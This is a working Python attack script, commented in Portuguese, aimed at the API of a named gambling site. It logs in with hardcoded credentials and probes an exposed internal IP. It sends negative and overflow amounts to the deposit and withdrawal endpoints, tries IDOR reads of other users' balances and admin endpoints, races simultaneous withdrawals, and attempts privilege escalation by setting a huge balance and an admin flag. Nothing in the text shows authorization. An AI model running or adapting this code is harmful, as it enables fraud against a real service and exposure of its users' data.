"""
Ataca a API com:
1. Token fresco do login
2. Endpoint correto descoberto no bundle
3. IP interno exposto na resposta do login
4. Testa depósito/saque negativo, IDOR, admin
"""
import urllib.request, ssl, json, uuid, threading, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# ── Configuração ────────────────────────────────────────
BASE   = "https://ds.amizade777.com"
JAPI   = "https://ds.amizade777.com"   # /japi/ fica no mesmo host
API_INT= "http://172.16.0.245:3001"    # IP INTERNO EXPOSTO
PKG    = "com.slots.big"
PHONE  = "21998498419"
PWD    = "21998498419"
DID    = "0beb614f-8838-43ef-00fc-0029f7d5d20f"

# ── HTTP helpers ────────────────────────────────────────
def _h(token=None, base=BASE):
    h = {
        "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept":       "*/*",
        "Origin":       base,
        "Referer":      base + "/",
    }
    if token: h["token"] = token
    return h

def post(base, path, data, token=None):
    body = json.dumps(data).encode()
    try:
        r = urllib.request.Request(base + path, data=body, headers=_h(token, base), method="POST")
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            return resp.status, json.loads(raw)
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}
    except Exception as ex:
        return 0, {"err": str(ex)}

def get(base, path, token=None):
    try:
        r = urllib.request.Request(base + path, headers=_h(token, base))
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            return resp.status, json.loads(raw)
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}
    except Exception as ex:
        return 0, {"err": str(ex)}

# ── STEP 1: Login e obter token fresco ──────────────────
print("=" * 60)
print("STEP 1: LOGIN")
print("=" * 60)

st, body = post(BASE, "/prod-api/player/sign-in", {
    "appChannel": "pc", "appPackageName": PKG,
    "deviceId": DID, "deviceModel": "WEB",
    "deviceVersion": "WEB", "appVersion": "1.0.0",
    "sysTimezone": None, "sysLanguage": None,
    "phone": PHONE, "password": PWD,
})

assert body.get("code") == 200, f"Login falhou: {body}"
data   = body["data"]
TOKEN  = data["token"]
MY_UID = data["user_info"]["user_id"]
API_IP = data.get("connection", {}).get("api", "")
print(f"  Login OK | UID={MY_UID} | Token={TOKEN[:40]}...")
print(f"  IP interno exposto: {API_IP}")

# ── STEP 2: Testar IP interno diretamente ───────────────
print("\n" + "=" * 60)
print("STEP 2: TESTAR IP INTERNO EXPOSTO (172.16.0.245:3001)")
print("=" * 60)

internal_paths = [
    "/api",
    "/api/player/info",
    "/api/player/balance",
    "/api/admin",
    "/api/admin/user/list",
    "/api/health",
    "/api/status",
    "/api/version",
    "/api/config",
    "/api/user/list",
    "/api/finance",
    "/",
]

for path in internal_paths:
    st2, body2 = get(API_INT, path, TOKEN)
    code2 = body2.get("code","?")
    msg2  = body2.get("msg","") or str(body2)[:60]
    if st2 not in (0,):
        flag = " *** ACESSÍVEL! ***" if st2 < 400 or code2 == 200 else ""
        print(f"  [{st2}] {path} -> code={code2} msg={msg2!r}{flag}")
        if code2 == 200:
            print(f"    DATA: {json.dumps(body2.get('data',{}), ensure_ascii=False)[:400]}")

# ── STEP 3: Depósito e saque com token fresco ──────────
# Os endpoints aceitam POST — testar
print("\n" + "=" * 60)
print("STEP 3: DEPÓSITO COM TOKEN FRESCO (POST)")
print("=" * 60)

# Endpoint CORRETO descoberto no bundle: /prod-api/pay-service/recharge
for amount in [-100, -1, 0, 0.000000001, 9007199254740991, 1]:
    time.sleep(0.5)
    st2, body2 = post(BASE, "/prod-api/pay-service/recharge", {
        "amount": amount,
        "appPackageName": PKG,
        "deviceId": DID,
    }, TOKEN)
    code2 = body2.get("code","?")
    msg2  = body2.get("msg","")
    flag  = " *** ACEITO! VULNERÁVEL! ***" if code2 == 200 else ""
    print(f"  amount={amount:<20} HTTP={st2} code={code2} msg={msg2!r}{flag}")
    if code2 == 200:
        print(f"    DATA: {json.dumps(body2.get('data',{}), ensure_ascii=False)[:400]}")

print("\n" + "=" * 60)
print("STEP 4: SAQUE COM TOKEN FRESCO (POST)")
print("=" * 60)

# Endpoint: /prod-api/payment/balance-less
for amount in [-100, -1, 0, 0.000000001, 9007199254740991, 1]:
    time.sleep(0.5)
    st2, body2 = post(BASE, "/prod-api/payment/balance-less", {
        "amount": amount,
        "appPackageName": PKG,
        "deviceId": DID,
    }, TOKEN)
    code2 = body2.get("code","?")
    msg2  = body2.get("msg","")
    flag  = " *** ACEITO! VULNERÁVEL! ***" if code2 == 200 else ""
    print(f"  amount={amount:<20} HTTP={st2} code={code2} msg={msg2!r}{flag}")
    if code2 == 200:
        print(f"    DATA: {json.dumps(body2.get('data',{}), ensure_ascii=False)[:400]}")

# ── STEP 5: IDOR ────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 5: IDOR — ACESSAR OUTROS USUÁRIOS")
print("=" * 60)

# Com o token, testar GET e POST para /japi/ com user_id de outros
# O bundle tem: /japi/user/balance/querySimpleBalance — mas para QUEM?
# Testar se aceita parâmetro user_id
for uid in [1, 2, MY_UID-1, MY_UID+1, 137000, 137028, 137059]:
    time.sleep(0.3)

    # Tentativa GET com query param
    for path in [
        f"/japi/user/balance/querySimpleBalance?userId={uid}",
        f"/japi/user/balance/querySimpleBalance?user_id={uid}",
        f"/japi/user/player/{uid}",
        f"/prod-api/player/{uid}",
    ]:
        st2, body2 = get(BASE, path, TOKEN)
        code2 = body2.get("code","?")
        if code2 == 200:
            d = body2.get("data","")
            if d and d != {"amount": 0, "withdrawAmount": 0, "inviteAmount": 0}:
                print(f"  *** IDOR [{st2}] {path}")
                print(f"    DATA: {json.dumps(d, ensure_ascii=False)[:300]}")

    # POST com user_id
    st2, body2 = post(BASE, "/japi/user/balance/querySimpleBalance",
                      {"userId": uid}, TOKEN)
    code2 = body2.get("code","?")
    if code2 == 200:
        d = body2.get("data","")
        print(f"  *** IDOR POST userId={uid}: {json.dumps(d, ensure_ascii=False)[:200]}")

# ── STEP 6: Painel Admin ────────────────────────────────
print("\n" + "=" * 60)
print("STEP 6: PAINEL ADMIN — TOKEN DE USUÁRIO NORMAL")
print("=" * 60)

for path in [
    "/prod-api/admin/player/list",
    "/prod-api/admin/user/list",
    "/prod-api/admin/finance",
    "/prod-api/admin/config",
    "/prod-api/admin/system",
    "/prod-api/admin/recharge/list",
    "/prod-api/admin/withdraw/list",
    "/japi/admin/user/list",
    "/japi/manage",
    "/japi/manage/finance",
]:
    time.sleep(0.3)
    for method_fn, label in [(lambda p: get(BASE, p, TOKEN), "GET"),
                              (lambda p: post(BASE, p, {}, TOKEN), "POST")]:
        st2, body2 = method_fn(path)
        code2 = body2.get("code","?")
        msg2  = body2.get("msg","")
        if code2 == 200 or st2 not in (0,404,405,403):
            flag = " *** ADMIN ACESSÍVEL! ***" if code2 == 200 else ""
            print(f"  [{label} {st2}] {path} -> code={code2} msg={msg2!r}{flag}")
            if code2 == 200:
                print(f"    DATA: {json.dumps(body2.get('data',{}), ensure_ascii=False)[:400]}")
            break

# ── STEP 7: Race condition ──────────────────────────────
print("\n" + "=" * 60)
print("STEP 7: RACE CONDITION — 5 SAQUES SIMULTÂNEOS")
print("=" * 60)

resultados = []
lock = threading.Lock()

def saque_thread(n):
    body_bytes = json.dumps({"amount": 1, "appPackageName": PKG, "deviceId": DID}).encode()
    h = {
        "User-Agent":   "Mozilla/5.0",
        "Content-Type": "application/json",
        "token":        TOKEN,
        "Origin":       BASE,
        "Referer":      BASE + "/",
    }
    try:
        r = urllib.request.Request(BASE + "/prod-api/payment/balance-less",
                                   data=body_bytes, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=15, context=ctx) as resp:
            result = (resp.status, json.loads(resp.read(4096).decode("utf-8","ignore")))
    except urllib.error.HTTPError as e:
        try:    result = (e.code, json.loads(e.read(2048).decode("utf-8","ignore")))
        except: result = (e.code, {})
    except Exception as ex:
        result = (0, {"err": str(ex)})
    with lock:
        resultados.append((n, result[0], result[1]))

threads = [threading.Thread(target=saque_thread, args=(i,)) for i in range(5)]
for t in threads: t.start()
for t in threads: t.join(timeout=20)

ok = sum(1 for _, _, b in resultados if b.get("code") == 200)
print(f"  {len(resultados)} respostas | {ok} aceitas (code=200)")
for n, st2, b in sorted(resultados):
    code2 = b.get("code","?")
    msg2  = b.get("msg","")
    flag  = " *** ACEITO ***" if code2 == 200 else ""
    print(f"  Thread {n}: HTTP={st2} code={code2} msg={msg2!r}{flag}")
if ok >= 2:
    print("  *** RACE CONDITION CONFIRMADA! ***")

# ── STEP 8: Escalada de privilégio ──────────────────────
print("\n" + "=" * 60)
print("STEP 8: ESCALADA DE PRIVILÉGIO E IDOR WRITE")
print("=" * 60)

for path, payload in [
    ("/prod-api/player/update", {"balance": 999999, "vipLevel": 99}),
    ("/prod-api/player/update", {"isAdmin": True, "role": "admin"}),
    ("/prod-api/player/update", {"user_id": 1, "balance": 999999}),
    ("/japi/user/balance/update", {"amount": 999999}),
    ("/japi/user/balance/addAmount", {"amount": 999999, "userId": MY_UID}),
]:
    time.sleep(0.4)
    st2, body2 = post(BASE, path, payload, TOKEN)
    code2 = body2.get("code","?")
    msg2  = body2.get("msg","")
    if st2 not in (0,404,405):
        flag = " *** ACEITO! ***" if code2 == 200 else ""
        print(f"  [POST {st2}] {path} -> code={code2} msg={msg2!r}{flag}")
        if code2 == 200:
            print(f"    DATA: {json.dumps(body2.get('data',{}), ensure_ascii=False)[:400]}")

print("\n\n" + "=" * 60)
print("RESUMO DAS ACHADAS")
print("=" * 60)
print(f"  user_id: {MY_UID}")
print(f"  phone: {PHONE}")
print(f"  invite_code: zudp7lqx")
print(f"  IP INTERNO EXPOSTO: {API_IP}")
print(f"  WebSocket: wss://ds.amizade777.com/websocket6")
print(f"  CloudFront detectado (headers X-Amz-Cf-*)")
print(f"  Servidor: nginx/1.24.0")
